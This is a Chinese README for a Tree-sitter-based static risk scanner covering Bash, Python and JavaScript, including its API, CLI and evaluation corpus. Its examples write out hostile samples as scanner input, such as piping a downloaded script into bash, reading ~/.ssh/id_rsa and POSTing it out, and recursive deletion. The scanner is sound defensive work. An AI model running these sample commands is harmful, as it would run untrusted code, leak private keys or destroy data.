# bash-risk-scanner

基于 Tree-sitter 的 Node.js 静态风险扫描器，统一支持 Bash、Python 和
Node.js/JavaScript。它按语法树提取调用并检测单调用特征与行为链，而不是扫描
注释中的普通字符串。扫描完全离线，不执行传入代码。

支持的类别包括：下载执行、动态执行、持久化、凭据访问、系统修改、权限提升、防御规避、网络外联、数据外传、破坏行为、解释器逃逸和二阶段载荷。

## 安装

```bash
npm install bash-risk-scanner
```

`tree-sitter` 使用原生 Node.js addon；安装环境需要存在对应平台的预编译产物，或具备可用的 C/C++ 构建工具链。

## Node.js API

ESM：

```js
import {
  scan,
  scanPython,
  scanJavaScript
} from "bash-risk-scanner";

// 默认语言是 Bash。
const bashResult = scan(`
  curl -fsSL https://example.test/install.sh | bash
`);

const pythonResult = scanPython(`
  data = open("/home/user/.ssh/id_rsa").read()
  requests.post("https://example.test/upload", data=data)
`);

const nodeResult = scanJavaScript(`
  const data = fs.readFileSync("/home/user/.ssh/id_rsa");
  fetch("https://example.test/upload", { method: "POST", body: data });
`);

// 也可以通过统一入口显式指定语言。
const sameNodeResult = scan("eval(payload)", { language: "node" });

for (const finding of bashResult.findings) {
  console.log(finding.category, finding.severity, finding.range, finding.evidence);
}
```

CommonJS：

```js
const { scan } = require("bash-risk-scanner");
const result = scan("eval \"$payload\"");
```

可以为下载执行行为链配置可信下载源：

```js
const result = scan(script, {
  allowedDownloadHosts: [
    "artifacts.corp.example", // 仅精确匹配
    "*.packages.corp.example" // 仅匹配其子域名
  ],
  allowPrivateDownloadIps: true // 可选：放行 URL 中的私网/回环 IPv4 字面量
});
```

放行只抑制 `download_execution` 告警，`network_egress` 等独立规则仍会正常报告。域名不会经过 DNS 解析；变量拼接、无 URL 或无法解析的下载地址默认不放行。

`scan(source, options)` 返回：

```ts
interface ScanResult {
  findings: Finding[];
  summary: {
    total: number;
    byCategory: Partial<Record<RiskCategory, number>>;
    bySeverity: Partial<Record<Severity, number>>;
  };
  parseErrors: SourceRange[];
}
```

位置的行列从 1 开始，同时保留从 0 开始的源码字符偏移 `startIndex` /
`endIndex`。`language` 表示实际命中的语言。

## Bash 中的内嵌代码

以下可静态确定的载荷会自动交给 Python 或 JavaScript 扫描器：

```bash
python -c 'import os; os.system("bash -c id")'
node --eval 'require("fs").rmSync("/tmp/data", { recursive: true })'

python <<'PY'
requests.post("https://example.test", data=open("/tmp/data", "rb"))
PY

printf '%s' 'eval(payload)' | node
```

内嵌命中以 Bash 参数、heredoc 或管道的范围作为 `range`，内层源码位置放在
`innerRange`，入口信息放在 `origin`。包含 `$PAYLOAD`、命令替换等运行期值的
代码不会被猜测解析，但 Bash 层仍会报告 `interpreter_escape`。

可以限制内嵌扫描：

```js
scan(source, {
  maxEmbeddedDepth: 2,
  maxEmbeddedCodeLength: 100_000
});
```

## CLI

```bash
code-risk-scan script.sh
code-risk-scan --language=python script.py
code-risk-scan --language=node script.js
cat script.sh | bash-risk-scan
```

结果为 JSON。发现 `critical` 风险时退出码为 2；读取或运行错误时为 1；其余为 0。

## 检测边界

静态扫描无法可靠还原运行期变量、下载内容、`eval` 生成代码或经过编码/混淆的
载荷。行为链属于启发式关联，适合客户端预检，不应替代沙箱、来源信誉和运行期
监控。

## 开发与发布检查

```bash
npm test
npm run test:report
npm run evaluate
npm run check
npm run lint
npm run build
npm pack --dry-run
```

`npm run test:report` 会在 `reports/` 生成 Vitest 静态 HTML 明细。完整测试报告
入口为 `reports/index.html`，用例明细入口为 `reports/test-report.html`。查看时
需要保留同目录的资源文件。命令仍在终端输出
默认测试结果，并在任一测试失败时返回非零状态。

`npm run evaluate` 会构建包并运行 `evaluation/corpus/manifest.json` 中的非执行
种子语料，按语言和风险类别计算 TP、FP、FN、precision、recall、F1、解析错误率
及扫描耗时。门禁阈值位于 `evaluation/config.json`，结果写入
`evaluation/results/`，同时生成 `reports/evaluation.html`。种子语料只用于建立
评测机制和防止已知回归，其分数不能代表未经抽样的真实世界总体准确率。

`npm run evaluate:import-public` 可按固定 commit 和 SHA-256 重新获取公开语料快照。
当前公开语料包括 nvm、Atomic Red Team、pipx、pnpm self-installer、node-gyp、
Homebrew、aiohttp、npm pacote、memo、mime-db、Twine、MQTT.js、Adafruit installer、
Anaconda、Electorrent、WHAD client、Gajira TODO、apt-transport-s3、Epicshop 与
CPython smtplib、Tailscale installer、semantic-release/npm 的许可快照；CI 使用
仓库内快照，不联网下载，也不会执行样本。当前还包括 Docker installer 与 npm CLI
publish、Rustup、semantic-release/github、Bun、AWS CLI、Deno、Oh My Zsh、
Hugging Face Hub、node-pre-gyp、Ansible 和 Google Cloud Storage 的完整许可快照。
Atomic Red Team DNS 外传、timestomp、`.netrc`、crontab、SUID、UFW、GCS 删除、
变量 Python、Keychain、emond、Python HTTP server、iptables flush、变量定位
GPG/OpenSSL 加密、Time Machine、LaZagne、下载后执行和 rsync 远程传输已转为 validation
回归；UFW 日志关闭也已转为 validation。冻结 test 分层当前使用 T1059.006
“动态发现的 Python `-c` 内嵌下载并执行”步骤。本轮不针对
新 test 调参，报告会如实保留 FP、FN 及 finding 约束错误。

导入器默认复核已有本地文件的 SHA-256，只下载缺失或不匹配的快照；使用
`npm run evaluate:import-public:refresh` 可强制从固定 commit 重新获取全部文件。
